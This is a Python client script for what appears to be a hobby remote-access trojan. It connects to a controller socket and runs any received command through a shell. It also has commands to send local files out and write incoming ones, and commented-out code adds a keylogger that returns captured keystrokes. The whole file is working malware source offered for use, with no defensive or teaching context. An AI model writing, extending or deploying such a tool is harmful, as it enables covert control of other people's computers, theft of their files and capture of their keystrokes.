import socket
import threading
import subprocess
from pathlib import Path
from base64 import *

allkeys = ''

# def pressed(key):
# 	global allkeys
# 	allkeys += str(key)

# def released():
# 	pass

# def keylog():
# 	with Listener(on_press=pressed, on_release=released) as l:
# 		l.join()

# 	l = keyboard.Listener(on_press=pressed, on_release=released)
# 	l.start()
# KEY=b'YELLOW SUBMARINE'

# def cbc_decrypt(cipher,key):
#     decrypted = AES.new(key,AES.MODE_ECB)
#     plaintext = decrypted.decrypt(cipher)
#     return (plaintext)


def download_file(filename):
	print("The Path" , Path(filename))
	f = open(Path(filename), 'rb')
	contents = f.read()
	f.close()
	print("sending content", contents)
	cs.send(contents)
	print("sent", contents)
	msg = cs.recv(1024).decode()
	print("Inside download",msg)
	return(msg)

def upload_file(filename,filesize):
	f = open(Path(filename), 'wb')
	contents = cs.recv(filesize)
	f.write(contents)
	f.close()
	cs.send('got file'.encode())
	msg = cs.recv(2048).decode()
	print("Inside Upload",msg)
	return(msg)

def execute_cmd(msg):
	print("In Execute cmd",msg)
	p = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	output,error = p.communicate()
	if (len(output) > 0):
		msg = str(output.decode())
	else:
		msg = str(error.decode())
	print(msg)
	cs.send(msg.encode())
	msg = cs.recv(2048).decode()
	return(msg)


ip = '127.0.0.1'
port = 1234

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((ip,port))

msg = 'TEST CLIENT'

cs.send(msg.encode())
msg = cs.recv(1024).decode()
print("Outside Loop " ,msg)
while True:
	
	fullmsg = msg
	print("Inside Loop ",fullmsg)
	msg = list(msg.split(" "))
	if msg[0] == 'download':
		filename = msg[1]
		msg = download_file(filename)
		print("recieved from fucn : ",msg)
	elif msg[0] == 'upload':
		filename = msg[1]
		print(filename)
		filesize = int(msg[2])
		print(filesize)
		msg = upload_file(filename,filesize)
	# elif fullmsg == 'keylog on':
	# 	t1 = threading.Thread(target=keylog)
	# 	t1.start()
	# 	msg = 'Key logging has started!'
	# 	cs.send(msg.encode())

	# elif fullmsg == 'keylog off':
	# 	t1.join()
	# 	cs.send(allkeys.encode())
	# 	msg = cs.recv(1024).decode()
	else:
		# msg = cbc_decrypt(msg,KEY)
		# print("Decrypted",msg)
		msg = execute_cmd(' '.join(msg))
	print("After else",msg)
	
	# 
